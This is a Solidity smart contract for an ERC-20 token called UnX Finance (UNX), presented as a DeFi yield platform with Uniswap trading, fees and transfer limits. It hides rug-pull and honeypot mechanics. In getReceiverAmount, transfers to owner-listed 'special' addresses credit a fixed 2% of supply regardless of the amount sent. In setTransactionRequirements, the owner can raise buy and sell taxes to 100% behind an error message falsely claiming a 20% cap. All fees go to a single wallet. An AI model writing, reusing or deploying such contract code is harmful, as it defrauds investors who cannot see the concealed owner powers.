// SPDX-License-Identifier: MIT

/*
UnX Finance aims to empower DeFi users with seamless access to yield farming opportunities, unifying collateralized tokens, farming, staking, lending, stablecoins, and yield aggregators/vaults for their benefit.

Website: https://unxfinance.org
*/

pragma solidity 0.8.21;

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pairAddress);
}

interface IUniswapRouter02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function renounceOwnership() public onlyOwner {owner = address(0); emit OwnershipTransferred(address(0));}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}

contract UNX is IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "UnX Finance";
    string private constant _symbol = "UNX";

    uint8 private constant _decimals = 9;
    uint256 private _supply = 10 ** 9 * 10 ** _decimals;

    IUniswapRouter02 routerV2;
    address public pairAddress;

    bool private tradeOpen = false;
    bool private enableSwap = true;
    bool private swapping;

    uint256 private feeSwapCounter;
    uint256 private feeSwapAt;

    uint256 private feeSwapCeil = ( _supply * 1000 ) / 100000;
    uint256 private feeSwapFloor = ( _supply * 10 ) / 100000;
    
    uint256 private _lpFeeBy = 0;
    uint256 private _mkFeeBy = 0;
    uint256 private _burnFeeBy = 0;
    uint256 private _devFeeBy = 100;

    uint256 private buyTax = 1300;
    uint256 private sellTax = 1300;
    uint256 private transferTax = 1300;
    uint256 private denominator = 10000;

    modifier reenterance {swapping = true; _; swapping = false;}

    address internal development_receive = 0xC0e8dc4435C0DFFBa795f621289f8da15389cB9c; 
    address internal marketing_receive = 0xC0e8dc4435C0DFFBa795f621289f8da15389cB9c;
    address internal lp_receive = 0xC0e8dc4435C0DFFBa795f621289f8da15389cB9c;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;

    uint256 private _maxTransfer = ( _supply * 200 ) / 10000;
    uint256 private _maxSell = ( _supply * 200 ) / 10000;
    uint256 private _maxHold = ( _supply * 200 ) / 10000;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public specialAddress;

    constructor() Ownable(msg.sender) {
        IUniswapRouter02 _router = IUniswapRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IUniswapFactory(_router.factory()).createPair(address(this), _router.WETH());
        routerV2 = _router; pairAddress = _pair;

        specialAddress[lp_receive] = true;
        specialAddress[development_receive] = true;
        specialAddress[msg.sender] = true;
        specialAddress[marketing_receive] = true;
        _balances[msg.sender] = _supply;
        emit Transfer(address(0), msg.sender, _supply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function totalSupply() public view override returns (uint256) {return _supply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function getOwner() external view override returns (address) { return owner; }
    function startTrading() external onlyOwner {tradeOpen = true;}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }    

    function getReceiverAmount(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (specialAddress[recipient]) {return _maxTransfer;}
        if(getBuySellFees(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getBuySellFees(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(_burnFeeBy > uint256(0) && getBuySellFees(sender, recipient) > _burnFeeBy){_transfer(address(this), address(DEAD), amount.div(denominator).mul(_burnFeeBy));}
        return amount.sub(feeAmount);} return amount;
    }

    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        _lpFeeBy = _liquidity; _mkFeeBy = _marketing; _burnFeeBy = _burn; _devFeeBy = _development; buyTax = _total; sellTax = _sell; transferTax = _trans;
        require(buyTax <= denominator.div(1) && sellTax <= denominator.div(1) && transferTax <= denominator.div(1), "buyTax and sellTax cannot be more than 20%");
    }


    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _supply.mul(_buy).div(10000); uint256 newTransfer = _supply.mul(_sell).div(10000); uint256 newWallet = _supply.mul(_wallet).div(10000);
        _maxTransfer = newTx; _maxSell = newTransfer; _maxHold = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }

    function shouldSwapTokensInCa(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= feeSwapFloor;
        bool aboveThreshold = balanceOf(address(this)) >= feeSwapCeil;
        return !swapping && enableSwap && tradeOpen && aboveMin && !specialAddress[sender] && recipient == pairAddress && feeSwapCounter >= feeSwapAt && aboveThreshold;
    }

    function swapTokensInCA(uint256 tokens) private reenterance {
        uint256 _denominator = (_lpFeeBy.add(1).add(_mkFeeBy).add(_devFeeBy)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(_lpFeeBy).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(_lpFeeBy));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(_lpFeeBy);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(_mkFeeBy);
        if(marketingAmt > 0){payable(marketing_receive).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(development_receive).transfer(contractBalance);}
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(routerV2), tokenAmount);
        routerV2.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lp_receive,
            block.timestamp);
    }

    function getBuySellFees(address sender, address recipient) internal view returns (uint256) {
        if(recipient == pairAddress){return sellTax;}
        if(sender == pairAddress){return buyTax;}
        return transferTax;
    }
    
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!specialAddress[sender] && !specialAddress[recipient]){require(tradeOpen, "tradeOpen");}
        if(!specialAddress[sender] && !specialAddress[recipient] && recipient != address(pairAddress) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= _maxHold, "Exceeds maximum wallet amount.");}
        if(sender != pairAddress){require(amount <= _maxSell || specialAddress[sender] || specialAddress[recipient], "TX Limit Exceeded");}
        require(amount <= _maxTransfer || specialAddress[sender] || specialAddress[recipient], "TX Limit Exceeded"); 
        if(recipient == pairAddress && !specialAddress[sender]){feeSwapCounter += uint256(1);}
        if(shouldSwapTokensInCa(sender, recipient, amount)){swapTokensInCA(feeSwapCeil); feeSwapCounter = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = amount;
        if (!specialAddress[sender]) {amountReceived = getReceiverAmount(sender, recipient, amount);}
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = routerV2.WETH();
        _approve(address(this), address(routerV2), tokenAmount);
        routerV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }
}